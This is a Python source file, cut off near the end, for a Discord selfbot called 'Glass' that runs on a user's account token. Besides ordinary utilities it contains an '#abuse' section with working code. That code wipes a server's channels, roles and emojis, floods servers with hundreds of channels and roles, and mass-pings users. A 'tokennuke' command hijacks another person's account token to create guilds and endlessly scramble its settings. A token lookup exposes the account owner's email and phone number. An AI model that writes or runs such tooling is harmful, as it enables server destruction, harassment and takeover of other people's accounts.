import aiohttp
import asyncio
import base64
import chat_exporter
import codecs
import ctypes
import datetime
import discord
import io
import itertools
import json
import os
import pyfiglet
import random
import re
import requests
import shutil
import string
import time
from gtts import gTTS
from discord.ext import commands
from urllib.parse import urlencode


ctypes.windll.kernel32.SetConsoleTitleW("Glass")
os.system("mode 60, 20")


def logo():
    print(f'''
 ██████╗ ██╗      █████╗ ███████╗███████╗
██╔════╝ ██║     ██╔══██╗██╔════╝██╔════╝
██║  ███╗██║     ███████║███████╗███████╗
██║   ██║██║     ██╔══██║╚════██║╚════██║
╚██████╔╝███████╗██║  ██║███████║███████║
 ╚═════╝ ╚══════╝╚═╝  ╚═╝╚══════╝╚══════╝
========================================='''.center(41))


def get_config():
    with open('commands.json') as f:
        t = json.load(f)
        global bot_commands
        bot_commands = t['commands']
        global help_descriptions
        help_descriptions = t['descriptions']
    with open('config.json') as f:
        global config
        config = json.load(f)
        # global password
        # password = config.get('discord password')
        global prefix
        prefix = config.get('prefix')
        global deletetimer
        deletetimer = config.get('delete timer')
        global title
        title = config.get('title')
        global fake_nitro_prefix
        fake_nitro_prefix = config.get('fake emotes prefix')
        sniper_settings = config.get('sniper')
        global nitro_sniper
        nitro_sniper = sniper_settings['nitro sniper']
        global giveaway_sniper
        giveaway_sniper = sniper_settings['giveaway sniper']
        global giveaway_delay
        giveaway_delay = sniper_settings['giveaway delay']
        dank_settings = config.get('dank')
        global event_delay
        event_delay = dank_settings['event delay']
        global dank_whitelist
        dank_whitelist = dank_settings['channel whitelist']
        global dank_channels
        dank_channels = dank_settings['channels']
    with open('giveaway-bots.json') as f:
        global giveaway_list
        giveaway_list = json.load(f)
        global giveaway_ids
        giveaway_ids = list(giveaway_list.keys())
    with open('fake_emotes.json') as f:
        global fake_nitro
        fake_nitro = json.load(f)
        global nitro_words
        nitro_words = list(fake_nitro.keys())
    with open('raid_tokens.txt', 'r') as f:
        global rtokens
        rtokens = f.read().splitlines()
get_config()


async def get_prefix(bot, message):
    with open('config.json', 'r') as f:
        configs = json.load(f)
        prefix = configs['prefix']
        return prefix


glass = discord.Client()
glass = commands.Bot(command_prefix=get_prefix, help_command=None, self_bot=True, case_insensitive=True)
token = config.get('token')
bot_init = False


# selfbot start
def init():
    while True:
        global token
        try:
            glass.run(token, bot=False, reconnect=True)
        except discord.errors.LoginFailure:
            print("Token not found or invalid\nPlease input a new token\nIf you don't know how to get your token, please create a ticket and ask")
            temp_token = input("Token: ")
            with open('config.json', 'r') as f:
                configs = json.load(f)
            configs['token'] = temp_token
            with open('config.json', 'w') as f:
                json.dump(configs, f, indent=4)
            print("Please restart the selfbot")
            time.sleep(5)
            exit()


# retry command on edit
@glass.event
async def on_message_edit(before, after):
    await glass.process_commands(after)


@glass.event
async def on_ready():
    global bot_init
    if not bot_init:
        global bot_start
        bot_start = datetime.datetime.now()
        logo()
        print(f"Logged in as: {glass.user}\nPrefix: {prefix}\n=========================================")
    bot_init = True


@glass.event
async def on_command(cmd):
    print(f"Command Used: {cmd.command.name}")


# help
@glass.command(aliases=['h'])
async def help(ctx, *, arg=None):
    await ctx.message.delete()
    if arg:
        text = arg.lower()
        if text in bot_commands.keys():
            bot_subcommands = bot_commands[text]
            if len(title) > 0:
                message = f"```asciidoc\n{title}\n" + "=" * len(title) + f"\n\n= {text.capitalize()} Commands =\n"
            else:
                message = f"```asciidoc\n= {text.capitalize()} Commands =\n"
            for category in bot_subcommands:
                command_info = bot_subcommands[category]
                descriptions = command_info['description']
                message = f"{message}{category} :: {descriptions}\n"
            message = f"{message}\n= To find out more information about a specific command, use {prefix}help <command> =\n```"
            await ctx.send(message, delete_after=deletetimer)
        else:
            for category in bot_commands:
                curr_list = list(bot_commands[category].keys())
                try:
                    prev_list = prev_list + curr_list
                except:
                    prev_list = curr_list
            if text in prev_list:
                for category in bot_commands:
                    try:
                        command_category = bot_commands[category]
                        command_info = command_category[text]
                    except:
                        pass
                description = command_info['description']
                usage = command_info['usage']
                aliases = command_info['aliases']
                tips = command_info['tips']
                if len(title) > 0:
                    message = f"```asciidoc\n{title}\n" + "=" * len(title) + "\n"
                message = f"{message}Command :: {text}\nDescription :: {description}\nUsage :: {prefix}{usage}\n"
                if aliases != "":
                    message = f"{message}Aliases :: {aliases}\n"
                if tips != "":
                    message = f"{message}Tips :: {tips}\n"
                message = f"{message}```"
                await ctx.send(message, delete_after=deletetimer)
            else:
                await ctx.send("```diff\n- Category/Command not found!```", delete_after=5)
    else:
        if len(title) > 0:
            message = f"```asciidoc\n{title}\n" + "=" * len(title) + "\n\n"
        else:
            message = "```asciidoc\n"
        message = f"{message}= Command Categories =\n"
        for category in help_descriptions:
            message = f"{message}help {category} :: {help_descriptions[category]}\n"
        message = f"{message}= You can also use \"{prefix}h\" as an alias for \"{prefix}help\" =\n```"
        await ctx.send(message, delete_after=deletetimer)


# text

# purge
@glass.command()
async def clean(ctx, *, text):
    await ctx.message.delete()
    glass.clean_stop = False
    try:
        delete_amount = int(text)
        if delete_amount > 0:
            count = 0
            async for message in ctx.channel.history().filter(lambda m: m.author == glass.user).map(lambda m: m):
                if not glass.clean_stop:
                    if delete_amount > count:
                        try:
                            await message.delete()
                            count += 1
                        except:
                            pass
                    else:
                        return
        else:
            await ctx.send("```yaml\nPlease input a valid integer```", delete_after=5)
    except:
        if text == 'all':
            async for message in ctx.message.channel.history().filter(lambda m: m.author == glass.user).map(lambda m: m):
                if not glass.clean_stop:
                    try:
                        await message.delete()
                    except:
                        pass
        elif text == 'stop':
            glass.clean_stop = True
            await ctx.send("```yaml\nStopping all cleaning```", delete_after=5)
        else:
            await ctx.send("```yaml\nInvalid Arguement```", delete_after=5)


# spam
@glass.command()
async def spam(ctx, text, *, message=None):
    await ctx.message.delete()
    try:
        amount = int(text)
        glass.spam_stop = False
        for i in range(amount):
            if not glass.spam_stop:
                await ctx.send(message)
    except:
        if text == 'stop':
            glass.spam_stop = True
            await ctx.send("```yaml\nStopping all spam```", delete_after=5)
        else:
            await ctx.send("```yaml\nInvalid Arguement```", delete_after=5)


# spoiler
@glass.command()
async def spoiler(ctx, *, text=None):
    await ctx.message.delete()
    if text:
        text = [letter for letter in text]
        text = ['||{0}||'.format(letter) for letter in text]
        text = ''.join(text)
        if len(text) > 2000:
            await ctx.send("```yaml\nText is too long```", delete_after=5)
        else:
            await ctx.send(text)
    else:
        await ctx.send("```yaml\nPlease input the text you would like to make a spoiler```", delete_after=5)


# hide
@glass.command()
async def hide(ctx, show=None, hide=None):
    if show and hide:
        text = f"{show}||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||{hide}"
        if len(text) > 2000:
            await ctx.message.delete()
            await ctx.send("```yaml\nText too long```", delete_after=5)
        else:
            await ctx.message.edit(content=text)
    else:
        await ctx.message.edit(content="```yaml\nPlease put in shown and hidden text```", delete_after=5)


# ascii
@glass.command()
async def ascii(ctx, *, text=None):
    await ctx.message.delete()
    if text:
        text = str(pyfiglet.figlet_format(text.strip()))
        if len('```' + text + '```') > 2000:
            await ctx.send("```yaml\nText too long```", delete_after=5)
        else:
            await ctx.send(f"```{text}```")
    else:
        await ctx.send("```yaml\nPlease input text to turn into ASCII```", delete_after=5)


@glass.command()
async def encode(ctx, *, text=None):
    await ctx.message.delete()
    if text:
        decoded_stuff = base64.b64encode('{}'.format(text).encode('ascii'))
        encoded_stuff = str(decoded_stuff)
        encoded_stuff = encoded_stuff[2:len(encoded_stuff)-1]
        await ctx.send(encoded_stuff)
    else:
        await ctx.send("```yaml\nPlease put in text```", delete_after=5)


@glass.command()
async def decode(ctx, *, text=None):
    await ctx.message.delete()
    if text:
        strOne = text.encode("ascii")
        pad = len(strOne) % 4
        strOne += b"=" * pad
        encoded_stuff = codecs.decode(strOne.strip(), 'base64')
        decoded_stuff = str(encoded_stuff)
        decoded_stuff = decoded_stuff[2:len(decoded_stuff) - 1]
        await ctx.send(decoded_stuff)
    else:
        await ctx.send("```yaml\nPlease put in text```", delete_after=5)


# utility

# ping
@glass.command()
async def ping(ctx):
    await ctx.message.delete()
    await ctx.send(f"```yaml\nPong! {round(glass.latency * 1000, 1)}ms```", delete_after=deletetimer)


# uptime
@glass.command()
async def uptime(ctx):
    await ctx.message.delete()
    current_time = datetime.datetime.now()
    difference = current_time - bot_start
    difference = str(difference - datetime.timedelta(microseconds=difference.microseconds))
    await ctx.send(f"```yaml\nUptime: {difference}```", delete_after=deletetimer)


# chatdump
@glass.command()
async def chatdump(ctx, channel_input=None, limit=None):
    await ctx.message.delete()
    if channel_input == None:
        channel = ctx.channel
    else:
        channel = glass.get_channel(int(channel_input))
        if channel == None:
            limit = int(channel_input)
            channel = ctx.channel
    if limit:
        try:
            int(limit)
        except:
            await ctx.send(f"```yaml\nPlease enter a valid limit or leave it blank```", delete_after=5)
    status_message = await ctx.send(f"```yaml\nDumping {channel.name}...```")
    transcript = await chat_exporter.export(channel, limit)
    if transcript is None:
        await status_message.edit(content="```yaml\nFailed to dump chat```", delete_after=5)
        return
    transcript_file = discord.File(io.BytesIO(transcript.encode()), filename=f"{channel.name}-dump.html")
    await status_message.delete()
    await ctx.send(file=transcript_file)


# servericon
@glass.command()
async def servericon(ctx, id=None):
    await ctx.message.delete()
    if id == None:
        try:
            await ctx.send(ctx.guild.icon_url_as(static_format='png'))
        except:
            await ctx.send("```yaml\nPlease input a server ID or use this command in a server```", delete_after=5)
            return
    else:
        try:
            id = int(id)
            server = glass.get_guild(id)
            server_icon = server.icon_url_as(static_format='png')
            await ctx.send(server_icon)
        except:
            await ctx.send("```yaml\nInvalid server ID```", delete_after=5)


# user avatar
@glass.command(aliases=['av'])
async def avatar(ctx, *, user: discord.User=glass.user):
    await ctx.message.delete()
    if user == None:
        user = glass.user
    try:
        user_avatar = user.avatar_url_as(static_format='png')
        await ctx.send(user_avatar)
    except:
        await ctx.send("```yaml\nFailed to get user's avatar```", delete_after=5)


# copy server
# @glass.command()
# async def copyserver(ctx, id=None):
#     await ctx.message.delete()
#     if id == None:
#         try:
#             await glass.create_guild(f"{ctx.guild.name} Copy")
#             await asyncio.sleep(3)
#
#         except:
#             await ctx.send("```yaml\nPlease input a server ID or use this command in a server```", delete_after=5)
#     else:
#         try:
#             id = int(id)
#             server = glass.get_guild(id)
#             server_icon = server.icon_url_as(static_format='png')
#             await ctx.send(server_icon)
#         except:
#             await ctx.send("```yaml\nInvalid server ID```", delete_after=5)


# reverse avatar
@glass.command(aliases=['revav'])
async def revavatar(ctx, user: discord.User=None):
    await ctx.message.delete()
    if user == None:
        user = glass.user
    try:
        await ctx.send(f"https://images.google.com/searchbyimage?image_url={user.avatar_url}")
    except:
        await ctx.send("```yaml\nFailed to get user's avatar```", delete_after=5)


# export friends
@glass.command()
async def exportfriends(ctx):
    await ctx.message.delete()
    friends = []
    for user in glass.user.friends:
        friends.append(f"{user.name}#{user.discriminator}")
    with open('Exported Friends.txt', 'w+', encoding='utf-8') as f:
        f.write("\n".join(friends))


# member info
@glass.command()
async def memberinfo(ctx, user: discord.Member=None):
    await ctx.message.delete()
    if isinstance(ctx.channel, discord.channel.DMChannel):
        await ctx.send("```yaml\nPlease use this in a server```", delete_after=5)
    else:
        if user == None:
            user = ctx.author
        try:
            since_created = (ctx.message.created_at - user.created_at).days
            user_created = user.created_at.strftime("%d %b %Y %H:%M")
            created_on = "{} ({} days ago)".format(user_created, since_created)
            since_created2 = (ctx.message.created_at - user.joined_at).days
            user_joined = user.joined_at.strftime("%d %b %Y %H:%M")
            joined_on = "{} ({} days ago)".format(user_joined, since_created2)
            message = f"```asciidoc\nMember Info\n===========\n\nMember :: {user.name}#{user.discriminator}\nID :: {user.id}\nAvatar :: {user.avatar_url_as(static_format='png')}\nJoined On :: {joined_on}\nCreated On :: {created_on}```"
            await ctx.send(message)
        except:
            await ctx.send("```yaml\nFailed to find member```")


# user info
@glass.command()
async def userinfo(ctx, user: discord.User=None):
    await ctx.message.delete()
    if user == None:
        user = glass.user
    try:
        since_created = (ctx.message.created_at - user.created_at).days
        user_created = user.created_at.strftime("%d %b %Y %H:%M")
        created_on = "{} ({} days ago)".format(user_created, since_created)
        message = f"```asciidoc\nUser Info\n=========\n\nUser :: {user.name}#{user.discriminator}\nID :: {user.id}\nAvatar :: {user.avatar_url_as(static_format='png')}\nCreated On :: {created_on}\nBot :: {user.bot}```"
        await ctx.send(message)
    except:
        await ctx.send("```yaml\nFailed to find user```")


# role info
@glass.command()
async def roleinfo(ctx, role: discord.Role=None):
    await ctx.message.delete()
    if isinstance(ctx.channel, discord.channel.DMChannel):
        await ctx.send("```yaml\nPlease use this in a server```", delete_after=5)
    else:
        if role:
            try:
                since_created = (ctx.message.created_at - role.created_at).days
                role_created = role.created_at.strftime("%d %b %Y %H:%M")
                created_on = "{} ({} days ago)".format(role_created, since_created)
                users = len([x for x in ctx.guild.members if role in x.roles])
                if str(role.colour) == "#000000":
                    color = "default"
                else:
                    color = str(role.color).upper()
                message = f"```asciidoc\nRole Info\n=========\n\nName :: {role.name}\nServer :: {role.guild}\nColor :: {color}\nPosition :: {role.position}\nCreated On :: {created_on}```"
                await ctx.send(message)
            except:
                await ctx.send("```yaml\nFailed to get role```", delete_after=5)
        else:
            await ctx.send("```yaml\nPlease put in a role```", delete_after=5)


# ip info
@glass.command()
async def ipinfo(ctx, ip=None):
    await ctx.message.delete()
    if ip:
        result = requests.get(f"http://ip-api.com/json/{ip}").json()
        if result['status'] == 'success':
            message = f"```asciidoc\nIP Info\n=========\n\nIP :: {ip}\nCountry :: {result['country']}\nRegion :: {result['regionName']}\nCity :: {result['city']}\nZip Code :: {result['zip']}\nTimezone :: {result['timezone']}\nISP :: {result['isp']}\nOrganization :: {result['org']}\nLatitude :: {result['lat']}\nLongitude :: {result['lon']}```"
            await ctx.send(message)
        else:
            await ctx.send("```yaml\nFailed to lookup the given IP```", delete_after=5)
    else:
        await ctx.send("```yaml\nPlease input a valid IP```", delete_after=5)


# token info
@glass.command()
async def tokeninfo(ctx, token_info=None):
    await ctx.message.delete()
    if token_info:
        headers = {'Authorization': token_info, 'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.305 Chrome/69.0.3497.128 Electron/4.0.8 Safari/537.36'}
        try:
            res = requests.get('https://canary.discordapp.com/api/v8/users/@me', headers=headers)
            res = res.json()
            creation_date = datetime.datetime.utcfromtimestamp(((int(res['id']) >> 22) + 1420070400000) / 1000).strftime('%d-%m-%Y %H:%M:%S UTC')
            message = f"```asciidoc\nToken Info\n==========\n\nUser :: {res['username']}#{res['discriminator']}\nID :: {res['id']}\nEmail :: {res['email']}\nCreated On :: {creation_date}\nAvatar :: https://cdn.discordapp.com/avatars/{res['id']}/{res['avatar']}\nPhone :: {res['phone']}\nFlags :: {res['flags']}\nLanguage :: {res['locale']}\n2FA :: {res['mfa_enabled']}\nVerified :: {res['verified']}```"
            await ctx.send(message)
        except KeyError:
            print(f"Error: Invalid Token")
    else:
        await ctx.send("```yaml\nPlease enter a token```", delete_after=5)


# shorten
@glass.command()
async def shorten(ctx, *, link=None):
    await ctx.message.delete()
    if link:
        try:
            r = requests.get(f'http://tinyurl.com/api-create.php?url={link}').text
            await ctx.send(r)
        except:
            await ctx.send("```yaml\nFailed to shorten link```", delete_after=5)
    else:
        await ctx.send("```yaml\nPlease put in a link to shorten```", delete_after=5)


# hypesquad change
@glass.command()
async def hypesquad(ctx, text=None):
    await ctx.message.delete()
    if text:
        headers = {'Authorization': token, 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.305 Chrome/69.0.3497.128 Electron/4.0.8 Safari/537.36'}
        if text == "bravery":
            choice = {'house_id': 1}
        elif text == "brilliance":
            choice = {'house_id': 2}
        elif text == "balance":
            choice = {'house_id': 3}
        try:
            requests.post('https://discordapp.com/api/v8/hypesquad/online', headers=headers, json=choice, timeout=10)
            await ctx.send(f"```yaml\nSuccessfully changed Hypesquad to {text}```", delete_after=5)
        except:
            await ctx.send("```yaml\nFailed to change Hypesquad```", delete_after=5)
    else:
        await ctx.send("```yaml\nPlease put in a house to change to```", delete_after=5)


# nitro
@glass.command()
async def nitro(ctx, amount: int=1):
    await ctx.message.delete()
    for i in range(amount):
        nitro_code = ''.join(random.choices(string.ascii_letters + string.digits, k=16))
        await ctx.send(f"https://discord.gift/{nitro_code}")


# timer
@glass.command()
async def timer(ctx, time=None, user: discord.User=None):
    await ctx.message.delete()
    if time:
        try:
            try:
                seconds_per_unit = {"s": 1, "m": 60, "h": 3600, "d": 86400}
                res = int(time[:-1]) * seconds_per_unit[time[-1]]
            except:
                res = int(time)
            message = await ctx.send(f":timer: Timer for `{time}` has been set!")
            await asyncio.sleep(res)
            await message.delete()
            if user == None:
                await ctx.send(f":alarm_clock: Timer for `{time}` is over!")
            else:
                await ctx.send(f":alarm_clock: Timer for `{time}` is over! {user.mention}")
        except:
            await ctx.send("```yaml\nPlease put in a valid time to wait```", delete_after=5)
    else:
        await ctx.send("```yaml\nPlease put in a time to wait```", delete_after=5)


# admin

# kick
@glass.command()
async def kick(ctx, member: discord.User=None, *, reason=None):
    await ctx.message.delete()
    if isinstance(ctx.channel, discord.channel.DMChannel):
        await ctx.send("```yaml\nPlease use this in a server```", delete_after=5)
    else:
        if member:
            try:
                await member.kick(reason=reason)
            except:
                await ctx.send("```yaml\nFailed to kick user. Make sure you have the correct permission```", delete_after=5)
        else:
            await ctx.send("```yaml\nPlease mention or input the user ID of the user you would like to kick```", delete_after=5)


# ban
@glass.command()
async def ban(ctx, member: discord.Member=None, *, reason=None):
    await ctx.message.delete()
    if isinstance(ctx.channel, discord.channel.DMChannel):
        await ctx.send("```yaml\nPlease use this in a server```", delete_after=5)
    else:
        if member:
            try:
                await member.ban(reason=reason)
            except:
                await ctx.send(
                    "```yaml\nFailed to ban user. Make sure you have the correct permission```", delete_after=5)
        else:
            await ctx.send("```yaml\nPlease mention or input the user ID of the user you would like to ban```", delete_after=5)


# nuke
@glass.command()
async def nuke(ctx, *, channel=None):
    await ctx.message.delete()
    if isinstance(ctx.channel, discord.channel.DMChannel):
        await ctx.send("```yaml\nPlease use this in a server```", delete_after=5)
    else:
        if channel == None:
            try:
                await ctx.channel.clone()
                await ctx.channel.delete()
            except:
                await ctx.send("```yaml\nMake sure you have Manage Channels permission```", delete_after=5)
        else:
            try:
                channel = await commands.TextChannelConverter().convert(ctx, channel)
            except:
                await ctx.send("```yaml\nMake sure you have Manage Channels permission```", delete_after=5)
            try:
                await channel.clone()
                await channel.delete()
            except:
                await ctx.send("```Invalid channel```", delete_after=5)


# nuke timer
@glass.command()
async def nuketimer(ctx, *, channel=None):
    await ctx.message.delete()
    if isinstance(ctx.channel, discord.channel.DMChannel):
        await ctx.send("```yaml\nPlease use this in a server```", delete_after=5)
    else:
        if channel == None:
            try:
                message = await ctx.send(f":warning:**CHANNEL WILL BE NUKED IN**:warning:\n```{pyfiglet.figlet_format('10')}```")
                await asyncio.sleep(1)
                await message.edit(content=f":warning:**CHANNEL WILL BE NUKED IN**:warning:\n```{pyfiglet.figlet_format('9')}```")
                await asyncio.sleep(1)
                await message.edit(content=f":warning:**CHANNEL WILL BE NUKED IN**:warning:\n```{pyfiglet.figlet_format('8')}```")
                await asyncio.sleep(1)
                await message.edit(content=f":warning:**CHANNEL WILL BE NUKED IN**:warning:\n```{pyfiglet.figlet_format('7')}```")
                await asyncio.sleep(1)
                await message.edit(content=f":warning:**CHANNEL WILL BE NUKED IN**:warning:\n```{pyfiglet.figlet_format('6')}```")
                await asyncio.sleep(1)
                await message.edit(content=f":warning:**CHANNEL WILL BE NUKED IN**:warning:\n```{pyfiglet.figlet_format('5')}```")
                await asyncio.sleep(1)
                await message.edit(content=f":warning:**CHANNEL WILL BE NUKED IN**:warning:\n```{pyfiglet.figlet_format('4')}```")
                await asyncio.sleep(1)
                await message.edit(content=f":warning:**CHANNEL WILL BE NUKED IN**:warning:\n```{pyfiglet.figlet_format('3')}```")
                await asyncio.sleep(1)
                await message.edit(content=f":warning:**CHANNEL WILL BE NUKED IN**:warning:\n```{pyfiglet.figlet_format('2')}```")
                await asyncio.sleep(1)
                await message.edit(content=f":warning:**CHANNEL WILL BE NUKED IN**:warning:\n```{pyfiglet.figlet_format('1')}```")
                await asyncio.sleep(1)
                new_channel = await ctx.channel.clone()
                await ctx.channel.delete()
                await new_channel.send("https://tenor.com/view/explosion-mushroom-cloud-atomic-bomb-bomb-boom-gif-4464831")
            except:
                await ctx.send("```yaml\nMake sure you have Manage Channels permission```", delete_after=5)
        else:
            try:
                channel = await commands.TextChannelConverter().convert(ctx, channel)
            except:
                await ctx.send("```yaml\nMake sure you have Manage Channels permission```", delete_after=5)
            try:
                message = await ctx.send(
                    f":warning:**CHANNEL WILL BE NUKED IN**:warning:\n```{pyfiglet.figlet_format('10')}```")
                await asyncio.sleep(1)
                await message.edit(
                    content=f":warning:**CHANNEL WILL BE NUKED IN**:warning:\n```{pyfiglet.figlet_format('9')}```")
                await asyncio.sleep(1)
                await message.edit(
                    content=f":warning:**CHANNEL WILL BE NUKED IN**:warning:\n```{pyfiglet.figlet_format('8')}```")
                await asyncio.sleep(1)
                await message.edit(
                    content=f":warning:**CHANNEL WILL BE NUKED IN**:warning:\n```{pyfiglet.figlet_format('7')}```")
                await asyncio.sleep(1)
                await message.edit(
                    content=f":warning:**CHANNEL WILL BE NUKED IN**:warning:\n```{pyfiglet.figlet_format('6')}```")
                await asyncio.sleep(1)
                await message.edit(
                    content=f":warning:**CHANNEL WILL BE NUKED IN**:warning:\n```{pyfiglet.figlet_format('5')}```")
                await asyncio.sleep(1)
                await message.edit(
                    content=f":warning:**CHANNEL WILL BE NUKED IN**:warning:\n```{pyfiglet.figlet_format('4')}```")
                await asyncio.sleep(1)
                await message.edit(
                    content=f":warning:**CHANNEL WILL BE NUKED IN**:warning:\n```{pyfiglet.figlet_format('3')}```")
                await asyncio.sleep(1)
                await message.edit(
                    content=f":warning:**CHANNEL WILL BE NUKED IN**:warning:\n```{pyfiglet.figlet_format('2')}```")
                await asyncio.sleep(1)
                await message.edit(
                    content=f":warning:**CHANNEL WILL BE NUKED IN**:warning:\n```{pyfiglet.figlet_format('1')}```")
                await asyncio.sleep(1)
                new_channel = await ctx.channel.clone()
                await ctx.channel.delete()
                await new_channel.send("https://tenor.com/view/explosion-mushroom-cloud-atomic-bomb-bomb-boom-gif-4464831")
            except:
                await ctx.send("```Invalid channel```", delete_after=5)


#abuse

# destroy server
@glass.command()
async def destroyserver(ctx, *, name=title):
    await ctx.message.delete()
    for channel in ctx.guild.channels:
        try:
            await channel.delete()
        except:
            pass
    # for member in list(ctx.guild.members):
    #     print(member)
    #     await member.ban()
    for role in ctx.guild.roles:
        try:
            await role.delete()
        except:
            pass
    try:
        await ctx.guild.edit(name=name, description=name, icon=None, banner=None, splash=None, region="india", reason=name)
    except:
        pass
    try:
        for count in range(500):
            await ctx.guild.create_text_channel(name)
    except:
        pass
    try:
        for count in range(250):
            await ctx.guild.create_role(name=name, colour=discord.Color(random.randint(0x000000, 0xFFFFFF)))
    except:
        pass


# nuke server
@glass.command()
async def nukeserver(ctx):
    await ctx.message.delete()
    for channel in ctx.guild.channels:
        try:
            await channel.delete()
        except:
            pass
    # for member in list(ctx.guild.members):
    #     print(member)
    #     await member.ban()
    for role in ctx.guild.roles:
        try:
            await role.delete()
        except:
            pass
    try:
        for emoji in ctx.guild.emojis:
            await emoji.delete()
    except:
        pass


# nuke channel
@glass.command()
async def nukechannel(ctx):
    await ctx.message.delete()
    for channel in ctx.guild.channels:
        try:
            await channel.delete()
        except:
            pass


# nuke role
@glass.command()
async def nukerole(ctx):
    await ctx.message.delete()
    for role in ctx.guild.roles:
        try:
            await role.delete()
        except:
            pass


# nuke emoji
@glass.command()
async def nukeemoji(ctx):
    await ctx.message.delete()
    for emoji in ctx.guild.emojis:
        try:
            await emoji.delete()
        except:
            pass


# spam channel
@glass.command()
async def spamchannel(ctx, *, name=title):
    await ctx.message.delete()
    try:
        for count in range(500):
            await ctx.guild.create_text_channel(name)
    except:
        pass


# spam role
@glass.command()
async def spamrole(ctx, *, name=title):
    await ctx.message.delete()
    try:
        for count in range(250):
            await ctx.guild.create_role(name=name, colour=discord.Color(random.randint(0x000000, 0xFFFFFF)))
    except:
        pass


# massgping
@glass.command()
async def massgping(ctx, user: discord.User = None, server = None):
    await ctx.message.delete()
    if server == None:
        if isinstance(ctx.channel, discord.channel.DMChannel):
            await ctx.send("```yaml\nPlease use this in a server or put in a server id```", delete_after=5)
        else:
            server = ctx.guild
    else:
        server = glass.get_guild(int(server))
    for channel in server.text_channels:
        try:
            gping = await channel.send(user.mention)
            await gping.delete()
        except:
            pass


# massping
@glass.command()
async def massping(ctx, user: discord.User = None, server = None):
    await ctx.message.delete()
    if server == None:
        if isinstance(ctx.channel, discord.channel.DMChannel):
            await ctx.send("```yaml\nPlease use this in a server or put in a server id```", delete_after=5)
        else:
            server = ctx.guild
    else:
        server = glass.get_guild(int(server))
    for channel in server.text_channels:
        await channel.send(user.mention)


# tokennuke
@glass.command()
async def tokennuke(ctx, token_nuke=None):
    await ctx.message.delete()
    if token:
        locales = ["da", "de", "en-GB", "en-US", "es-ES", "fr", "hr", "it", "lt", "hu", "nl", "no", "pl", "pt-BR", "ro", "fi", "sv-SE", "vi", "tr", "cs", "el", "bg", "ru", "uk", "th", "zh-CN", "ja", "zh-TW", "ko"]
        headers = {'Content-Type': 'application/json', 'Authorization': token_nuke, 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.305 Chrome/69.0.3497.128 Electron/4.0.8 Safari/537.36'}
        request = requests.Session()
        payload = {'theme': "light", 'locale': "ja", 'message_display_compact': False, 'inline_embed_media': False, 'inline_attachment_media': False, 'gif_auto_play': False, 'render_embeds': False, 'render_reactions': False, 'animate_emoji': False, 'convert_emoticons': False, 'enable_tts_command': False, 'explicit_content_filter': '0', 'status': "invisible"}
        guild = {'channels': None, 'icon': None, 'name': "LMAOOO", 'region': "europe"}
        for _i in range(50):
            requests.post('https://discordapp.com/api/v8/guilds', headers=headers, json=guild)
        while True:
            try:
                request.patch("https://canary.discordapp.com/api/v8/users/@me/settings", headers=headers, json=payload)
            except Exception as e:
                print(f"Error: {e}")
            else:
                break
        modes = itertools.cycle(["light", "dark"])
        statuses = itertools.cycle(["online", "idle", "dnd", "invisible"])
        while True:
            setting = {'theme': next(modes),'locale': random.choice(locales), 'status': next(statuses)}
            while True:
                try:
                    request.patch("https://canary.discordapp.com/api/v8/users/@me/settings", headers=headers, json=setting, timeout=10)
                except Exception as e:
                    print(f"Error: {e}")
                else:
                    break
    else:
        await ctx.send("```yaml\nPlease put in a token to nuke```", delete_after=5)


# configs

# change prefix
@glass.command(name='prefix')
async def prefix_change(ctx, *, text):
    await ctx.message.delete()
    with open('config.json', 'r') as f:
        configs = json.load(f)
    configs['prefix'] = text
    with open('config.json', 'w') as f:
        json.dump(configs, f, indent=4)
    global prefix
    prefix = text
    await ctx.send(f"```yaml\nPrefix changed to: {text}```", delete_after=5)


# change title
@glass.command(name='title')
async def title_change(ctx, *, text):
    await ctx.message.delete()
    with open('config.json', 'r') as f:
        configs = json.load(f)
    configs['title'] = text
    with open('config.json', 'w') as f:
        json.dump(configs, f, indent=4)
    global title
    title = text
    await ctx.send(f"```yaml\nTitle changed to: {text}```", delete_after=5)


# change delete timer
@glass.command(name='deletetimer')
async def delete_timer(ctx, *, time_wait: int):
    await ctx.message.delete()
    with open('config.json', 'r') as f:
        configs = json.load(f)
    configs['delete timer'] = time_wait
    with open('config.json', 'w') as f:
        json.dump(configs, f, indent=4)
    global deletetimer
    deletetimer = time_wait
    await ctx.send(f"```yaml\nDelete Timer set to: {time_wait}```", delete_after=5)


# giveawaysniper
@glass.command()
async def giveawaysniper(ctx):
    await ctx.message.delete()
    global giveaway_sniper
    with open('config.json', 'r') as f:
        configs = json.load(f)
    configs['sniper']['giveaway sniper'] = not giveaway_sniper
    with open('config.json', 'w') as f:
        json.dump(configs, f, indent=4)
    giveaway_sniper = not giveaway_sniper
    await ctx.send(f"```yaml\nGiveaway sniper set to: {giveaway_sniper}```", delete_after=5)


# nitrosniper
@glass.command()
async def nitrosniper(ctx):
    await ctx.message.delete()
    global nitro_sniper
    with open('config.json', 'r') as f:
        configs = json.load(f)
    configs['sniper']['nitro sniper'] = not nitro_sniper
    with open('config.json', 'w') as f:
